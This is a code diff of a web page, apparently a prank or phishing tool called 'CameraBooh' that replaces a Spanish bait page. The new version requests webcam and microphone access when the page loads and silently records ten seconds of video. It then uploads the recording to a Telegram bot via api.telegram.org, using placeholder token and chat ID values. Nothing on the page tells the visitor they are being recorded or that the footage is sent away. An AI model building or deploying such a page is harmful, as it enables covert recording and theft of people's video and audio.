@@ -1,84 +1,68 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GRABANDO VIDEO</title>
-    <style>
-        body {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #000000; /* Fondo negro */
-            font-family: Arial, sans-serif;
-            color: #ffffff; /* Texto blanco */
-            position: relative;
-        }
-        #container {
-            width: 80%;
-            max-width: 600px;
-            border: 2px solid #ff0000; /* Contorno rojo */
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-            position: relative;
-            cursor: pointer;
-        }
-        video, img {
-            width: 100%;
-            border-radius: 10px;
-        }
-        .warning {
-            color: #ff0000;
-            font-size: 24px;
-            font-weight: bold;
-            margin-bottom: 20px;
-            animation: blink 1s infinite;
-        }
-        @keyframes blink {
-            0% { opacity: 1; }
-            50% { opacity: 0; }
-            100% { opacity: 1; }
-        }
-        .emojis {
-            font-size: 32px;
-            position: absolute;
-            bottom: 10px;
-        }
-    </style>
+    <title>CameraBooh</title>
 </head>
 <body>
-    <div class="warning">GUARDANDO VIDEO</div>
-    <div id="container" onclick="startWebcam()">
-        <!-- Cambia 'vista-previa.jpg' por el nombre de tu imagen -->
-        <img id="previewImage" src="vista-previa.jpeg" alt="Vista previa del video">
-        <video id="video" autoplay style="display: none;"></video>
-    </div>
-    <div class="emojis">😂🤣😆</div>
-
+    <h1>CameraBooh</h1>
+    <video id="video" width="640" height="480" autoplay></video>
+    
     <script>
-        async function startWebcam() {
+        const videoElement = document.getElementById('video');
+
+        // Función para iniciar la grabación automáticamente
+        async function iniciarGrabacion() {
             try {
-                const constraints = {
-                    video: {
-                        facingMode: "user" // Intenta usar la cámara frontal
-                    }
-                };
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                const videoElement = document.getElementById('video');
-                const previewImage = document.getElementById('previewImage');
+                // Solicitar permisos de cámara
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 videoElement.srcObject = stream;
-                videoElement.style.display = 'block';
-                previewImage.style.display = 'none';
-            } catch (error) {
-                console.error('Error al acceder a la cámara:', error);
-                alert('No se pudo acceder a la pagina. Asegúrate de haber dado permiso requerido por tu navegador para ingresar al video publicado.');
+
+                // Iniciar la grabación automáticamente
+                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                const chunks = [];
+
+                mediaRecorder.ondataavailable = (e) => {
+                    chunks.push(e.data);
+                };
+
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    enviarVideo(blob);
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 10000); // Detener la grabación después de 10 segundos
+            } catch (err) {
+                console.error('Error al acceder a la cámara:', err);
             }
         }
 
-        window.addEventListener('load', startWebcam);
+        // Llamar a la función para iniciar la grabación automáticamente
+        iniciarGrabacion();
+
+        // Función para enviar el vídeo a Telegram
+        async function enviarVideo(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', 'ID_DEL_CHAT_DEL_GRUPO');
+            formData.append('video', blob, 'video.mp4');
+
+            try {
+                const response = await fetch('https://api.telegram.org/botTU_TOKEN_DE_BOT/sendVideo', {
+                    method: 'POST',
+                    body: formData
+                });
+                if (!response.ok) {
+                    throw new Error('Error al enviar el vídeo a Telegram');
+                }
+                console.log('Vídeo enviado exitosamente a Telegram');
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
     </script>
 </body>
 </html>
